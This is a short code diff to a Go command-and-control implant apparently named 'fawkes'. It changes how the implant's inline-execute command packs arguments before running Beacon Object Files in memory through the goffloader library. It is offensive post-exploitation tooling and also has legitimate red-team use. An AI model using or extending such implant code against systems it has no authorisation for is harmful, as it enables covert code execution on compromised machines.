@@ -12,6 +12,7 @@ import (
 	"fawkes/pkg/structs"
 
 	"github.com/praetorian-inc/goffloader/src/coff"
+	"github.com/praetorian-inc/goffloader/src/lighthouse"
 )
 
 // InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
@@ -29,9 +30,9 @@ func (c *InlineExecuteCommand) Description() string {
 
 // InlineExecuteParams represents the parameters for inline-execute
 type InlineExecuteParams struct {
-	BOFB64        string `json:"bof_b64"`         // Base64-encoded BOF bytes
-	EntryPoint    string `json:"entry_point"`     // Entry point function name
-	PackedArgsB64 string `json:"packed_args_b64"` // Base64-encoded packed arguments
+	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
+	EntryPoint string   `json:"entry_point"` // Entry point function name
+	Arguments  []string `json:"arguments"`   // Goffloader format arguments (e.g., ["zbing.com", "i80"])
 }
 
 // Execute executes the inline-execute command
@@ -74,11 +75,11 @@ func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult 
 		}
 	}
 
-	// Decode packed arguments
-	packedArgs, err := base64.StdEncoding.DecodeString(params.PackedArgsB64)
+	// Pack arguments using goffloader's lighthouse.PackArgs
+	packedArgs, err := lighthouse.PackArgs(params.Arguments)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding packed arguments: %v", err),
+			Output:    fmt.Sprintf("Error packing arguments: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -88,6 +89,7 @@ func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult 
 	var output strings.Builder
 	output.WriteString(fmt.Sprintf("[*] BOF size: %d bytes\n", len(bofBytes)))
 	output.WriteString(fmt.Sprintf("[*] Entry point: %s\n", params.EntryPoint))
+	output.WriteString(fmt.Sprintf("[*] Arguments: %v\n", params.Arguments))
 	output.WriteString(fmt.Sprintf("[*] Packed arguments size: %d bytes\n", len(packedArgs)))
 
 	// Load and execute the BOF
